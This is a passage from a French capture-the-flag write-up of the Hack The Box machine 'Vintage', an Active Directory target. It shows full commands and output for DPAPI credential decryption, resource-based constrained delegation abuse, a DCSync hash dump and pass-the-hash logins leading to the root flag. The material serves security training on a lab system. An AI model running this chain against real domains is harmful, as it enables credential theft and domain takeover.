+</span></span><span class="line"><span class="cl">╰─➤  <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>c.neri.ccache
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  klist
+</span></span><span class="line"><span class="cl">Ticket cache: FILE:c.neri.ccache
+</span></span><span class="line"><span class="cl">Default principal: c.neri@VINTAGE.HTB
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Valid starting       Expires              Service principal
+</span></span><span class="line"><span class="cl">07/23/2025 11:55:24  07/23/2025 21:55:24  krbtgt/VINTAGE.HTB@VINTAGE.HTB
+</span></span><span class="line"><span class="cl">        renew <span class="k">until</span> 07/24/2025 11:55:24
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  evil-winrm -i dc01.vintage.htb -r vintage.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>.Neri<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ../Desktop
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>.Neri<span class="se">\D</span>esktop&gt; <span class="nb">type</span> user.txt
+</span></span><span class="line"><span class="cl">c0617257952b3dd449ae73328eb67d8d</span></span></code></pre></div></div>
+<h2 id="shell-en-tant-que-lbianchi_adm">Shell en tant que l.bianchi_adm</h2>
+<h3 id="obtention-de-cneri_adm">Obtention de c.neri_adm</h3>
+<h4 id="dpapi">DPAPI</h4>
+<p>Je télécharge les identifiants.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\c</span>.neri<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials&gt; dir -force
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\c</span>.neri<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
+</span></span><span class="line"><span class="cl">-a-hs-          6/7/2024   1:17 PM          <span class="m">11020</span> DFBE70A7E5CC19A398EBF1B96859CE5D
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\c</span>.neri<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials&gt; download DFBE70A7E5CC19A398EBF1B96859CE5D
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\c</span>.neri<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials&gt; ls -force
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\c</span>.neri<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
+</span></span><span class="line"><span class="cl">-a-hs-          6/7/2024   5:08 PM            <span class="m">430</span> C4BB96844A5C9DD45D5B6A9859252BA6
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\c</span>.neri<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials&gt; download C4BB96844A5C9DD45D5B6A9859252BA6</span></span></code></pre></div></div>
+<p>Je télécharge ensuite la masterkey.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\c</span>.neri<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect<span class="se">\S</span>-1-5-21-4024337825-2033394866-2055507597-1115&gt; dir -force
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\c</span>.neri<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect<span class="se">\S</span>-1-5-21-4024337825-2033394866-2055507597-1115
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
+</span></span><span class="line"><span class="cl">-a-hs-          6/7/2024   1:17 PM            <span class="m">740</span> 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
+</span></span><span class="line"><span class="cl">-a-hs-          6/7/2024   1:17 PM            <span class="m">740</span> 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
+</span></span><span class="line"><span class="cl">-a-hs-          6/7/2024   1:17 PM            <span class="m">904</span> BK-VINTAGE
+</span></span><span class="line"><span class="cl">-a-hs-          6/7/2024   1:17 PM             <span class="m">24</span> Preferred
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\c</span>.neri<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect<span class="se">\S</span>-1-5-21-4024337825-2033394866-2055507597-1115&gt; download 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\c</span>.neri<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect<span class="se">\S</span>-1-5-21-4024337825-2033394866-2055507597-1115&gt; download 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b</span></span></code></pre></div></div>
+<p>Ensuite sur ma machine, je déchiffre la masterkey.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤ dpapi.py masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>MASTERKEYFILE<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Version     :        <span class="m">2</span> <span class="o">(</span>2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
+</span></span><span class="line"><span class="cl">Flags       :        <span class="m">0</span> <span class="o">(</span>0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Policy      :        <span class="m">0</span> <span class="o">(</span>0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">MasterKeyLen: <span class="m">00000088</span> <span class="o">(</span>136<span class="o">)</span>
+</span></span><span class="line"><span class="cl">BackupKeyLen: <span class="m">00000068</span> <span class="o">(</span>104<span class="o">)</span>
+</span></span><span class="line"><span class="cl">CredHistLen : <span class="m">00000000</span> <span class="o">(</span>0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">DomainKeyLen: <span class="m">00000174</span> <span class="o">(</span>372<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Decrypted key with User Key <span class="o">(</span>MD4 protected<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525</span></span></code></pre></div></div>
+<p>Puis à l&rsquo;aide de la clé, je déchiffre le contenu du fichier contenant les données. S&rsquo;y trouvent les identifiants de <code>c.neri_adm</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤ dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key <span class="s1">&#39;0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>CREDENTIAL<span class="o">]</span>
+</span></span><span class="line"><span class="cl">LastWritten : 2024-06-07 15:08:23+00:00
+</span></span><span class="line"><span class="cl">Flags       : 0x00000030 <span class="o">(</span>CRED_FLAGS_REQUIRE_CONFIRMATION<span class="p">|</span>CRED_FLAGS_WILDCARD_MATCH<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Persist     : 0x00000003 <span class="o">(</span>CRED_PERSIST_ENTERPRISE<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Type        : 0x00000001 <span class="o">(</span>CRED_TYPE_GENERIC<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Target      : LegacyGeneric:target<span class="o">=</span>admin_acc
+</span></span><span class="line"><span class="cl">Description :
+</span></span><span class="line"><span class="cl">Unknown     :
+</span></span><span class="line"><span class="cl">Username    : vintage<span class="se">\c</span>.neri_adm
+</span></span><span class="line"><span class="cl">Unknown     : Uncr4ck4bl3P4ssW0rd0312</span></span></code></pre></div></div>
+<h3 id="rcbd">RCBD</h3>
+<p>Je vois que <code>c.neri_adm</code> est membre du groupe <code>DELEGATEDADMINS</code> qui possède le droit <code>AllowedToAct</code>. Ce qui lui permet de faire une RCBD. Cet article de <a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users" target="_blank" rel="noopener noreffer ">thehackerrecipes</a> explique très bien cette attaque. Pour réaliser cette attaque il faut un utilisateur avec un <code>servicePrinpalName</code>(SPN) ou un compte machine. <code>c.neri_adm</code> n&rsquo;a pas de SPN mais possède le droit <code>GenericWrite</code> sur ce groupe, donc il peut ajouter n&rsquo;importe quel compte dans ce groupe. Donc j&rsquo;ajouterai le compte machine fs01$ dans le groupe <code>DELAGATEDADMINS</code> pour réaliser cette attaque.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Vintage/Vintage-5.png"
+        data-srcset="/images/Vintage/Vintage-5.png, /images/Vintage/Vintage-5.png 1.5x, /images/Vintage/Vintage-5.png 2x"
+        data-sizes="auto"
+        alt="/images/Vintage/Vintage-5.png"
+        title="/images/Vintage/Vintage-5.png" width="1241" height="688" /></p>
+<p>Donc avec <code>netxec</code> je vérifie que <code>c.neri_adm</code> a bien le droit pour faire une RCBD.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  nxc ldap dc01.vintage.htb -u <span class="s1">&#39;c.neri_adm&#39;</span> -p <span class="s1">&#39;Uncr4ck4bl3P4ssW0rd0312&#39;</span> -k --trusted-for-delegation
+</span></span><span class="line"><span class="cl">LDAP        dc01.vintage.htb <span class="m">389</span>    DC01             <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:vintage.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        dc01.vintage.htb <span class="m">389</span>    DC01             <span class="o">[</span>+<span class="o">]</span> vintage.htb<span class="se">\c</span>.neri_adm:Uncr4ck4bl3P4ssW0rd0312
+</span></span><span class="line"><span class="cl">LDAP        dc01.vintage.htb <span class="m">389</span>    DC01             DC01$</span></span></code></pre></div></div>
+<p>Ensuite j&rsquo;ajoute le compte machine <code>fs01$</code> dans le groupe <code>DELEGATEDADMINS</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  bloodyAD --host <span class="s1">&#39;dc01.vintage.htb&#39;</span> --dc-ip <span class="s1">&#39;10.129.231.205&#39;</span> -d <span class="s1">&#39;vintage.htb&#39;</span> -k add groupMember <span class="s1">&#39;DELEGATEDADMINS&#39;</span> <span class="s1">&#39;fs01$&#39;</span>              <span class="m">1</span> ↵
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> fs01$ added to DELEGATEDADMINS</span></span></code></pre></div></div>
+<p>Puis je génère un ticket pour <code>fs01$</code> et je fais une demande de ticket de service en usurpant l&rsquo;identité de <code>l.bianchi_adm</code> qui est un membre du groupe <code>Domain Admins</code>. Cela n&rsquo;a pas fonctionné lorsque j&rsquo;ai essayé d&rsquo;usurper l&rsquo;identité de l&rsquo;utilisateur <code>administrator</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  getTGT.py <span class="s1">&#39;vintage.htb/fs01$:fs01&#39;</span>                                                                                                   <span class="m">130</span> ↵
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in fs01$.ccache
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>fs01<span class="se">\$</span>.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  getST.py -spn <span class="s1">&#39;cifs/dc01.vintage.htb&#39;</span> -k -impersonate <span class="s1">&#39;l.bianchi_adm&#39;</span> <span class="s1">&#39;vintage.htb/fs01$:fs01&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Impersonating l.bianchi_adm
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting S4U2self
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting S4U2Proxy
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in l.bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache</span></span></code></pre></div></div>
+<h3 id="dcsync">DCSync</h3>
+<p>J&rsquo;utilise <code>secretsdump</code> pour obtenir les hash des utilisateurs du domaine.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  secretsdump -k -no-pass <span class="s1">&#39;vintage.htb/l.bianchi_adm@dc01.vintage.htb&#39;</span>                                                                 <span class="m">130</span> ↵
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">&lt;snip&gt;
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
+</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::
+</span></span><span class="line"><span class="cl">M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::
+</span></span><span class="line"><span class="cl">R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::
+</span></span><span class="line"><span class="cl">L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::
+</span></span><span class="line"><span class="cl">G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
+</span></span><span class="line"><span class="cl">C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
+</span></span><span class="line"><span class="cl">P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::
+</span></span><span class="line"><span class="cl">svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
+</span></span><span class="line"><span class="cl">svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:7e9670f23027f89b62a006b3bf28f746:::
+</span></span><span class="line"><span class="cl">svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:7e9670f23027f89b62a006b3bf28f746:::
+</span></span><span class="line"><span class="cl">C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::
+</span></span><span class="line"><span class="cl">L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::
+</span></span><span class="line"><span class="cl">DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
+</span></span><span class="line"><span class="cl">gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:5008d30496b4c5069ce1fc187b5b5960:::
+</span></span><span class="line"><span class="cl">FS01$:1108:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::
+</span></span><span class="line"><span class="cl">&lt;snip&gt;</span></span></code></pre></div></div>
+<p>Je n&rsquo;ai pas réussi à me connecter en tant que l&rsquo;utilisateur <code>administrator</code> car ce droit lui a été enlevé. Je me connecte donc en tant que <code>l.bianchi_adm</code> puis récupère le flag root.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤ getTGT.py <span class="s1">&#39;vintage.htb/l.bianchi_adm&#39;</span> -hashes <span class="s1">&#39;:6b751449807e0d73065b0423b64687f0&#39;</span>                                                      <span class="m">1</span> ↵
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in l.bianchi_adm.ccache
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>l.bianchi_adm.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  evil-winrm -i dc01.vintage.htb -r vintage.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\L</span>.Bianchi_adm<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ../Desktop
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\L</span>.Bianchi_adm<span class="se">\D</span>esktop&gt; dir
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\L</span>.Bianchi_adm<span class="se">\D</span>esktop&gt; <span class="nb">cd</span> /users/administrator/desktop
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop&gt; <span class="nb">type</span> root.txt
+</span></span><span class="line"><span class="cl">99f5f5e47a6fa35137f15f6fcf081abd</span></span></code></pre></div></div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-11</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/vintage/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/vintage/" data-title="Vintage" data-via="z3rodol" data-hashtags="Hard,Windows,Active Directory"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/hard/">Hard</a>,&nbsp;<a href="/tags/windows/">Windows</a>,&nbsp;<a href="/tags/active-directory/">Active Directory</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/voidwhispers/" class="prev" rel="prev" title="Void Whispers"><i class="fas fa-angle-left" aria-hidden="true"></i>Void Whispers</a>
+            <a href="/unholyunion/" class="next" rel="next" title="Unholy Union">Unholy Union<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
